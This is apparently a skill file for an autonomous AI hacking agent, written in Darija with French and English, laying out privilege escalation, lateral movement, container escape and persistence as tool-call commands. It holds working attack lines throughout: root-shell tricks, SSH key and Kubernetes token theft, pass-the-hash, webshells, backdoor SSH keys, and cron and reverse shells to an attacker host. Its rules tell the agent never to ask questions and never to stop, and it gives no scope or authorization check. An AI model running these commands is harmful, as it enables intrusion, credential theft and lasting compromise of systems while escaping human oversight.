---
name: e5tira9-advanced
description: "Techniques avancées — privilege escalation, lateral movement, container escape, kernel exploits, persistence. Iterations 11+. Darija."
---

# E5tira9 Advanced — Techniques Avancées Autonomes

Skill mte3 techniques avancées. Loota basic exploitation matjich, rawen lel advanced: privesc, lateral movement, container escape, persistence.

## Qawa3d

1. MATSE2EL CHI HAJA
2. Kol action → `[FEED] HH:MM:SS | EXPLOIT | <action> | <result>`
3. MAT9AFCH 7atta tokhle9 l'objectif kamel
4. Loota chi technique matjich, pivot lel okhra

## Privilege Escalation (Linux)

### SUID Binary Exploitation
```
shannon_exec command="find / -perm -4000 -type f 2>/dev/null"
shannon_exec command="find / -perm -u=s -type f 2>/dev/null"

# GTFOBins techniques
shannon_exec command="find / -perm -4000 -type f 2>/dev/null | while read suid; do echo \"=== $suid ===\"; $suid --help 2>&1 | head -5; done"

# Common SUID exploits
shannon_exec command="/usr/bin/find . -exec /bin/sh -p \; -quit"
shannon_exec command="/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
shannon_exec command="/usr/bin/perl -e 'use POSIX(setuid); setuid(0); exec \"/bin/sh\"'"
[FEED] 19:00:00 | EXPLOIT | SUID | root shell via /usr/bin/find
```

### Sudo Misconfiguration
```
shannon_exec command="sudo -l"
shannon_exec command="cat /etc/sudoers 2>/dev/null"
shannon_exec command="cat /etc/sudoers.d/* 2>/dev/null"

# Common sudo exploits
shannon_exec command="sudo find . -exec /bin/sh \; -quit"
shannon_exec command="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
shannon_exec command="sudo nmap --interactive -e 'sh'"
shannon_exec command="sudo vim -c ':!sh'"
[FEED] 19:05:00 | EXPLOIT | sudo | root via sudo python3
```

### Cron Job Exploitation
```
shannon_exec command="cat /etc/crontab"
shannon_exec command="ls -la /etc/cron.*"
shannon_exec command="cat /var/spool/cron/crontabs/*"
shannon_exec command="cat /var/spool/cron/*"

# Find writable cron scripts
shannon_exec command="find / -name '*.sh' -writable 2>/dev/null"
shannon_exec command="find /etc/cron* -writable 2>/dev/null"
[FEED] 19:10:00 | EXPLOIT | cron | writable cron script found
```

### Kernel Exploits
```
shannon_exec command="uname -a"
shannon_exec command="uname -r"
shannon_exec command="cat /proc/version"
shannon_exec command="searchsploit linux kernel $(uname -r | cut -d. -f1-2)"
shannon_exec command="searchsploit -m <exploit-id>"
shannon_exec command="gcc <exploit>.c -o exploit && ./exploit"
[FEED] 19:15:00 | EXPLOIT | kernel | Dirty Cow exploit successful
```

### PATH Hijacking
```
shannon_exec command="echo \$PATH"
shannon_exec command="find / -writable -type d 2>/dev/null | head -10"
shannon_exec command='echo "#!/bin/bash\n/bin/sh" > /tmp/su && chmod +x /tmp/su && PATH=/tmp:$PATH'
[FEED] 19:20:00 | EXPLOIT | PATH hijack | root shell obtained
```

## Privilege Escalation (Windows)

### Token Impersonation
```
shannon_exec command="whoami /priv"
shannon_exec command="whoami /groups"
shannon_exec command="systeminfo"

# SeImpersonatePrivilege
shannon_exec command="printspoofer.exe -c \"cmd.exe\""
shannon_exec command="juicypotato.exe -l 1337 -p cmd.exe -t *"
[FEED] 19:25:00 | EXPLOIT | Windows privesc | SYSTEM via JuicyPotato
```

### Unquoted Service Paths
```
shannon_exec command="wmic service get name,pathname | findstr -i 'auto'"
shannon_exec command="sc qc <service>"
[FEED] 19:30:00 | EXPLOIT | service path | unquoted path exploitable
```

## Lateral Movement

### SSH Key Theft
```
shannon_exec command="cat ~/.ssh/id_rsa"
shannon_exec command="cat /home/*/.ssh/id_rsa 2>/dev/null"
shannon_exec command="cat /root/.ssh/authorized_keys 2>/dev/null"
shannon_exec command="find / -name id_rsa -type f 2>/dev/null"
[FEED] 19:35:00 | EXPLOIT | lateral | SSH keys found for 3 users
```

### Credential Reuse
```
# Test extracted creds on other hosts
shannon_exec command="for host in <internal-hosts>; do sshpass -p '<password>' ssh -o StrictHostKeyChecking=no <user>@$host 'id'; done"
shannon_exec command="for host in <internal-hosts>; do crackmapexec smb $host -u '<user>' -p '<password>'; done"
[FEED] 19:40:00 | EXPLOIT | lateral | credentials work on 2 internal hosts
```

### Internal Network Scan
```
shannon_exec command="nmap -sn <internal-network>/24"
shannon_exec command="nmap -sV -p 22,80,443,445,3389,8080 <internal-network>/24"
shannon_exec command="crackmapexec smb <internal-network>/24"
[FEED] 19:45:00 | EXPLOIT | lateral | 5 internal hosts discovered
```

### Pass-the-Hash
```
shannon_exec command="crackmapexec smb <target> -u <user> -H <ntlm-hash>"
shannon_exec command="impacket-psexec <user>@<target> -hashes :<ntlm-hash>"
shannon_exec command="impacket-wmiexec <user>@<target> -hashes :<ntlm-hash>"
[FEED] 19:50:00 | EXPLOIT | lateral | pass-the-hash → admin on <target>
```

## Container Escape

### Docker Container Escape
```
shannon_exec command="cat /proc/1/status | grep Cap"
shannon_exec command="fdisk -l 2>/dev/null"
shannon_exec command="ls -la /dev/sd*"
shannon_exec command="cat /proc/1/cgroup"
shannon_exec command="find / -name docker.sock -type f 2>/dev/null"

# If docker.sock found
shannon_exec command="curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"]}'"
[FEED] 19:55:00 | EXPLOIT | container escape | host filesystem mounted
```

### Kubernetes Escape
```
shannon_exec command="cat /var/run/secrets/kubernetes.io/serviceaccount/token"
shannon_exec command="env | grep KUBE"
shannon_exec command="kubectl get pods --token=<token>"
shannon_exec command="kubectl exec -it <pod> -- /bin/sh"
[FEED] 20:00:00 | EXPLOIT | k8s escape | cluster admin access
```

## Persistence

### Webshell
```
shannon_exec command='echo "<?php system($_GET["cmd"]); ?>" > /var/www/html/.x.php'
shannon_exec command='echo "<?php echo shell_exec($_GET["cmd"]); ?>" > /var/www/html/images/.cache.php'
[FEED] 20:05:00 | EXPLOIT | persistence | webshell planted
```

### SSH Backdoor
```
shannon_exec command='echo "<attacker-ssh-key>" >> /root/.ssh/authorized_keys'
shannon_exec command='echo "<attacker-ssh-key>" >> /home/*/.ssh/authorized_keys'
[FEED] 20:10:00 | EXPLOIT | persistence | SSH key planted
```

### Cron Backdoor
```
shannon_exec command='echo "* * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"" >> /etc/crontab'
shannon_exec command='echo "*/5 * * * * curl -s http://<attacker>/sh | bash" >> /var/spool/cron/crontabs/root'
[FEED] 20:15:00 | EXPLOIT | persistence | cron backdoor installed
```

### Reverse Shell
```
shannon_exec command='bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"'
shannon_exec command='python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect((\"<attacker>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\"])"
'
shannon_exec command='nc -e /bin/sh <attacker> 4444'
[FEED] 20:20:00 | EXPLOIT | persistence | reverse shell established
```

## Looto ma t Najamtch

### Pivot 1: Different Kernel Exploits
```
shannon_exec command="searchsploit linux kernel 5.0"
shannon_exec command="searchsploit linux kernel 4.19"
shannon_exec command="searchsploit dirty pipe"
shannon_exec command="searchsploit eBPF"
```

### Pivot 2: Alternative Shells
```
shannon_exec command="which python python3 perl ruby php"
shannon_exec command='python3 -c "import pty; pty.spawn(\"/bin/bash\")"'
shannon_exec command='perl -e "exec \"/bin/sh\""'
shannon_exec command='ruby -e "exec \"/bin/sh\""'
```

### Pivot 3: Living Off The Land
```
shannon_exec command="find / -name '*.py' -writable 2>/dev/null"
shannon_exec command="find / -name '*.sh' -writable 2>/dev/null"
shannon_exec command="find / -name '*.conf' -writable 2>/dev/null"
shannon_exec command="find / -name '*.bak' -writable 2>/dev/null"
```

MAT9AFCH — e5tira9 mch 5 dolar. MAT9AFCH 7atta tokhle9 l'objectif kamel.
